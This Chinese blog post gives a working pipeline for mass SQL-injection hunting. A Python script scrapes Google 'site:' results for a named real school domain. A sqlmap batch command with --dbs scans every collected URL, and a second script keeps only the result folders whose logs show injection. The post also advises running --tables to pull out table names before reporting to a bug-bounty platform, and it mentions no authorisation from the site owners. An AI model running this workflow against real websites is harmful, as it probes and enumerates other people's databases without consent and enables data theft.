大佬们好，这篇文章我想写一下使用google
hacking收集网址，并用sqlmap自动化扫描，最后筛选出存在注入的网址，用于提交到漏洞盒子（或者别的平台）。

## 1.信息收集

我写了一个python脚本，可以很方便的收集指定条件的网址。代码如下：

    
    
    import time
    
    import requests
    from lxml import etree
    from requests.exceptions import ProxyError
    
    
    def getGoogleUrl(url,headers):
           try:
               resp = requests.get(url, headers=headers)
               html_content = resp.content.decode("utf-8")
               html = etree.HTML(html_content)
               url_list = html.xpath("//*/@href")
               f = open(r"C:\Users\Administrator\Desktop\tourzj.txt", "a")
               try:
                   a = 0
                   for url in url_list:
                       if "/search?" in url:
                           continue
                       if "google.com" in url:
                           continue
                       if ".jp" in url:
                           continue
                       if "#" in url:
                           continue
                       if "tw" in url:
                           continue
                       if "hk" in url:
                           continue
                       if "facebook" in url:
                           continue
                       if url == "":
                           break
                       f.write(url + "\n")
                       print(url + "成功存入！")
                       a = a + 1
                   f.close()
               except(Exception):
                   print("爬取失败！")
               return a
           except ProxyError:
               print("网络问题，连接失败，准备重新连接！")
               x = 0
               while x < 3:
                   getGoogleUrl(url, headers)
                   x += 1
    
    if __name__ == '__main__':
        #id q  type_id  bid pid a c d e m
        #uid cid classid  sid tid  typeid u name page productid BigClassName
        #  search  kw orderby start year month
        #  sortid sort date pageid catid itemid num no cat_id
        #  siteid articleid eventid g eid fid kid mid lid
        # h j k l n r s t v x
        #aid did gid hid jid nid c
        # cat  view data page_code  mode  doc  product_id  prodId  categoryid  groupid
        # news_id  table    cate  show  userID  CartId  misc  xid  page_id cart_id cname
        search = 'site:tourzj.edu.cn'
        url = "https://www.google.com.hk/search?q="+ search +"&hl=zh-cn&ei=ft8BZOjdJ8GfseMP59C8oA0&ved=0ahUKEwjolImk2b_9AhXBT2wGHWcoD9QQ4dUDCBA&uact=5&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQA0oECEEYAFAAWPH6TmDm_E5oBHAAeAGAAf8EiAGwJ5IBCjItMTIuMS4xLjKYAQCgAQHAAQE&sclient=gws-wiz-serp&start="
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
        }
    
        for page in range(0,360,10):
            a = getGoogleUrl(url+str(page),headers)
            print("第{}頁".format(page // 10))
            print("本页共有{}个数据url".format(a))
            time.sleep(3)
    
    
    

代码写的很烂，大佬们将就看，能用就行啦。使用这个代码之前需要科学上网，我用的是ikuuu，是一个免费的，可自行百度安装。代码运行效果如下图所示：

![1681814922_643e758a44b43c10af671.png!small?1681814901058](https://image.3001.net/images/20230418/1681814922_643e758a44b43c10af671.png!small?1681814901058)

这些网址保存的路径为：f = open(r"C:\Users\Administrator\Desktop\tourzj.txt", "a")
所以只需要修改这两个地方就行了。我注释的那些东西就是参数。可以一个一个的收集。

我想过，写一个循环让这些参数自动跑，但是不行，因为收集的过程中代理随时会挂，要重新弄就挺麻烦的。

注意：如果发生如下情况，说明可能是代理挂了，就需要更换。

![1681815145_643e76692c926d25fe1da.png!small?1681815124141](https://image.3001.net/images/20230418/1681815145_643e76692c926d25fe1da.png!small?1681815124141)

## 2.使用sqlmap跑

当收集好了网址之后，就可以使用工具自动扫描了。

![1681815408_643e777098421938a2d20.png!small?1681815387419](https://image.3001.net/images/20230418/1681815408_643e777098421938a2d20.png!small?1681815387419)

常用的命令是：

    
    
    sqlmap.py -m C:\sqlmapresult\test.txt --level 3 --risk 2 --batch --dbs --output-dir C:\sqlmapresult --random-agent

这样所有网址扫描的结果，就会保存在C:\sqlmapresult路径里。大家可以自行更改。

## 3.数据筛选

扫描完成之后，sqlmapresult文件夹中就有了所有的网址扫描结果。如下如所示。

![1681815840_643e79205291b751717fc.png!small?1681815819156](https://image.3001.net/images/20230418/1681815840_643e79205291b751717fc.png!small?1681815819156)

我们随便打开一个文件夹看：

![1681815865_643e7939d0f2b64f55218.png!small?1681815844376](https://image.3001.net/images/20230418/1681815865_643e7939d0f2b64f55218.png!small?1681815844376)

  

我们只需要关注log文件即可，如果log文件大于0kb，那么这个网址基本就存在注入了。我们打开log文件查看：

![1681815967_643e799fb03e452c56d14.png!small?1681815946334](https://image.3001.net/images/20230418/1681815967_643e799fb03e452c56d14.png!small?1681815946334)

里面详细的写出了注入出的数据库名字，还有注入参数。这种就可以提交到平台上了。运气好的话，说不定还可以挖到cnvd。

接下来最重要的一个问题。就是要找出所有log文件大于0的文件夹。（因为你收集的大多数网址都是不存在注入的。当sqlmap生成了几百个文件夹，手工看也太浪费时间了。）

下面这段代码就是筛选出log文件大于0的文件夹，如下所示：

    
    
    import os
    import shutil
    
    list1 = []
    def get_path(file_path):
        for root, dirs, files in os.walk(file_path):
            s = root+"\log"
            if os.path.getsize(s) == 0:
                shutil.rmtree(root)
    
    if __name__ == "__main__":
        file_path = r"C:\Users\Administrator\Desktop\filepath"
        get_path(file_path)

上面代码的使用方式：1.首先在你sqlmap生成结果的文件夹里，创建一个log文件，里面随便写点东西，文件大于0就可以；

![1681816399_643e7b4f1abb667ed6b19.png!small?1681816377764](https://image.3001.net/images/20230418/1681816399_643e7b4f1abb667ed6b19.png!small?1681816377764)

2.file_path = r"C:\Users\Administrator\Desktop\filepath"
这个路径就是sqlmap生成结果的文件夹路径，运行下即可。最后保留的就全是log文件大于0的了。

当然，并不是log文件大于0就一定存在注入，可能存在注入，但是没有数据，也可能是access数据库，所以你还要继续使用--tables命令把表明注入出来，就可以提交。

> 参考文章：https://www.freebuf.com/articles/web/223436.html

